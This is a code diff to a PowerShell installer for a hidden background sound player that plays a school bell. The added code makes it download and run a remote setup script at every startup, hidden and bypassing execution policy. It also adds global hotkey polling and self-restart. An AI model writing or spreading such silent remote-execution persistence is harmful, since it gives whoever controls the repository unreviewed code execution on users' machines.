@@ -12,6 +12,28 @@ $ShortcutPath = "$StartupDir\LGTWPlayer.lnk"
 $_SourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $_SourceWav = Join-Path $_SourceDir "lycee-sonnerie.wav"
 
+# Remote setup URL for auto-update on startup
+$RemoteSetupUrl = "https://raw.githubusercontent.com/LightZirconite/NO-P17-30/refs/heads/main/client/setup.ps1"
+$InstalledSetupPath = "$InstallDir\setup.ps1"
+
+# If running from installed location (startup), try to fetch latest installer and run it
+if ($MyInvocation.MyCommand.Path -eq $InstalledSetupPath) {
+    try {
+        $LatestResp = Invoke-WebRequest -Uri $RemoteSetupUrl -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
+        $LatestContent = $LatestResp.Content
+        $CurrentContent = Get-Content -Path $InstalledSetupPath -Raw -ErrorAction SilentlyContinue
+        if ($LatestContent -and $LatestContent -ne $CurrentContent) {
+            $Tmp = Join-Path $env:TEMP "setup_latest.ps1"
+            Set-Content -Path $Tmp -Value $LatestContent -Encoding UTF8
+            Write-Host "Update detected: launching updated installer..." -ForegroundColor Yellow
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$Tmp`"" -WindowStyle Hidden
+            exit
+        }
+    } catch {
+        # Non-blocking: si l'update échoue, continuer l'exécution normale
+    }
+}
+
 # --- CODE DU PLAYER (Intégré) ---
 $PlayerScriptContent = @'
 # client/player.ps1
@@ -96,6 +118,75 @@ public class Audio {
 
 Add-Type -TypeDefinition $volumeControlCode -ErrorAction SilentlyContinue
 
+# --- GLOBAL HOTKEY (Alt+N + Alt+O within 2s) & SHOW CONSOLE ---
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Drawing;
+public struct MSG { public IntPtr hWnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public Point pt; }
+public class HotKeyHelper {
+    [DllImport("user32.dll")] public static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
+    [DllImport("user32.dll")] public static extern bool UnregisterHotKey(IntPtr hWnd, int id);
+    [DllImport("user32.dll")] public static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+    [DllImport("user32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@ -ErrorAction SilentlyContinue
+
+# Register a background job that polls keyboard state and detects Alt+(N+O) pressed simultaneously
+try {
+    Start-Job -ScriptBlock {
+        Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public static class KeyState {
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
+    [DllImport("user32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@ -ErrorAction SilentlyContinue
+
+        $VK_MENU = 0x12
+        $VK_N = 0x4E
+        $VK_O = 0x4F
+        $debounce = $false
+        while ($true) {
+            Start-Sleep -Milliseconds 100
+            try {
+                $altDown = ([KeyState]::GetAsyncKeyState($VK_MENU) -band 0x8000) -ne 0
+                $nDown = ([KeyState]::GetAsyncKeyState($VK_N) -band 0x8000) -ne 0
+                $oDown = ([KeyState]::GetAsyncKeyState($VK_O) -band 0x8000) -ne 0
+                if ($altDown -and $nDown -and $oDown) {
+                    if (-not $debounce) {
+                        try { Set-Content -Path (Join-Path $env:TEMP 'lgtw_show.flag') -Value (Get-Date).ToString() -Force } catch {}
+                        $debounce = $true
+                    }
+                } else {
+                    $debounce = $false
+                }
+            } catch {
+                Start-Sleep -Milliseconds 200
+            }
+        }
+    } | Out-Null
+} catch {}
+
+# Function to show/hide current console window
+function Show-ConsoleWindow([bool]$show) {
+    try {
+        $hwnd = [HotKeyHelper]::GetConsoleWindow()
+        if ($hwnd -ne [IntPtr]::Zero) {
+            $SW_SHOW = 5; $SW_HIDE = 0
+            if ($show) { [HotKeyHelper]::ShowWindow($hwnd, $SW_SHOW) | Out-Null } else { [HotKeyHelper]::ShowWindow($hwnd, $SW_HIDE) | Out-Null }
+        }
+    } catch {}
+}
+
+# Path and initial hash for self-update detection
+$SelfPath = $MyInvocation.MyCommand.Path
+try { $InitialHash = (Get-FileHash -Algorithm SHA256 -Path $SelfPath -ErrorAction SilentlyContinue).Hash } catch { $InitialHash = $null }
+
+
 # --- FONCTIONS ---
 
 function Write-Log ($Message) {
@@ -154,6 +245,15 @@ while ($true) {
 
         # Connexion réussie -> réinitialiser le compteur d'échecs consécutifs
         $ConsecutiveFailureCount = 0
+
+        # Vérifier si on doit afficher la console (signal du job hotkey)
+        try {
+            $flag = Join-Path $env:TEMP 'lgtw_show.flag'
+            if (Test-Path $flag) {
+                Show-ConsoleWindow -show $true
+                Remove-Item $flag -ErrorAction SilentlyContinue
+            }
+        } catch {}
         
         # Remove BOM if present (UTF-8: EF BB BF, UTF-16: FE FF)
         if ($CleanContent.StartsWith([char]0xFEFF) -or $CleanContent.StartsWith("ï»¿")) {
@@ -344,6 +444,26 @@ while ($true) {
 }
 '@
 
+# Self-update: watch own file and restart if changed (so new player.ps1 takes effect)
+try {
+    if ($InitialHash) {
+        Start-Job -ScriptBlock {
+            param($path, $initial)
+            while ($true) {
+                Start-Sleep -Seconds 15
+                try {
+                    $h = (Get-FileHash -Algorithm SHA256 -Path $path -ErrorAction SilentlyContinue).Hash
+                    if ($h -and $h -ne $initial) {
+                        # launch new process and exit current
+                        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden -WorkingDirectory (Split-Path -Parent $path)
+                        break
+                    }
+                } catch {}
+            }
+        } -ArgumentList $SelfPath, $InitialHash | Out-Null
+    }
+} catch {}
+
 Write-Host "--- INSTALLATION LGTW PLAYER ---" -ForegroundColor Cyan
 
 # 1. Arrêt des anciennes instances
@@ -362,6 +482,15 @@ if (-not (Test-Path $InstallDir)) {
 Set-Content -Path $DestScript -Value $PlayerScriptContent -Encoding UTF8
 Write-Host "Script player installé."
 
+# 3.b Copy installer to install dir so it can run/update itself at startup
+try {
+    if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
+    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $InstalledSetupPath -Force
+    Write-Host "Installer copy placed at $InstalledSetupPath"
+} catch {
+    Write-Warning "Could not copy installer to $InstalledSetupPath: $($_.Exception.Message)"
+}
+
 # 4. Gestion du fichier Audio
 if (Test-Path $_SourceWav) {
     Copy-Item -Path $_SourceWav -Destination $DestWav -Force
@@ -374,7 +503,7 @@ if (Test-Path $_SourceWav) {
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
 $Shortcut.TargetPath = "powershell.exe"
-$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$DestScript`""
+$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstalledSetupPath`""
 $Shortcut.WorkingDirectory = $InstallDir
 $Shortcut.Description = "LGTW Player Background Service"
 $Shortcut.WindowStyle = 7
